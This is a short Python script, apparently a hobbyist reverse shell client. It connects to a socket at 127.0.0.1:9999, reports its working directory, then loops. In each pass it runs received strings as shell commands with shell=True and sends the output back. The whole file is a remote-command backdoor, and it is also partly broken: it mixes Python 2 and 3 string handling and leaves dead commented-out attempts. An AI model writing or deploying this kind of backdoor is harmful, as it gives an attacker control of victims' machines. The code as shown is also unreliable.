#connect to server, wait for instructions, execute commands, and send results back to server

import os
import socket
import subprocess

s = socket.socket()
host = '127.0.0.1'
port = 9999
s.connect((host,port))
#print s.recv(1024)
dirs = b"%s>" % str(os.getcwd())
s.send(dirs)


while True:

    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd': #no output from cd so need sot be handled differently
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0: #ensure there is data
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        #output_str = str(output_bytes, "utf-8")
        #cropping and cutting for the last dir
        output_str = str(output_bytes)
        output_cwd = str(os.getcwd())
        output_cwd =  output_cwd.split("/")
        dir3 = (output_cwd[-1:])
        #encoding = str.encode(output_str, str(os.getcwd()) + '> ')
        OSDIR = ''.join([str(item) for item in dir3])
        encoding = b"%s %s> " % (output_str,OSDIR)
        s.send(encoding,)
        #encoding2 = b"%s " % output_cwd
        #s.send(encoding2)
        #encoding_test = output_str.encode(output_str,'utf-8')
        #s.send(encoding_test)
        print(output_str) #prints command to own terminal
        #attempts without encoding
        #s.send("second Test")
        #s.send(cmd.stdout.read())

#Close Connection
s.close()
